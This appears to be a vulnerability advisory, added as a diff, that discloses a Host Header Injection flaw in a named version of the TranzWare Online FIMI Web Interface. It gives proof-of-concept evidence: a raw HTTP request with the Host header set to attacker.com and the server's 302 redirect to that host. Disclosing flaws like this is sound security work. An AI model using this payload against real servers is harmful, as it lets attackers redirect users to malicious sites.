@@ -1,0 +1,49 @@
+Host Header Injection
+---------------------
+
+Type: Unauthenticated Remote attack
+
+We have identified that the  “TranzWare Online FIMI Web Interface (Tranzware Online (TWO) Version: 5.3.33.3 F38, FIMI Version: 4.2.19.4 25)” is affected by Host Header Injection attacks. HTTP host header can be manipulated and cause the application to behave in unexpected ways. Any changes made to the header would just cause the request to be sent to a completely different Domain/IP address. This is due to that the server implicitly trusts the Host header, and fails to validate or escape it properly. An attacker may be able to use this input to redirect target users to a malicious domain/web page. This would result in expanding the potential to further attacks and malicious actions.
+
+
+Evidence is provided:
+
+Request:
+GET / HTTP/1.1
+Host: attacker.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+Cache-Control: max-age=0
+
+
+Response:
+HTTP/1.1 302 Found
+Date: Mon, 13 Sep 2021 08:54:55 GMT
+Server: RCB
+X-Frame-Options: SAMEORIGIN
+Strict-Transport-Security: max-age=63072000; includeSubdomains; preload
+Location: https://attacker.com/index.php
+Content-Length: 214
+Connection: close
+Content-Type: text/html; charset=iso-8859-1
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>302 Found</title>
+</head><body>
+<h1>Found</h1>
+<p>The document has moved <a href="https://attacker.com/index.php">here</a>.</p>
+</body></html>
+
+
+
+
+
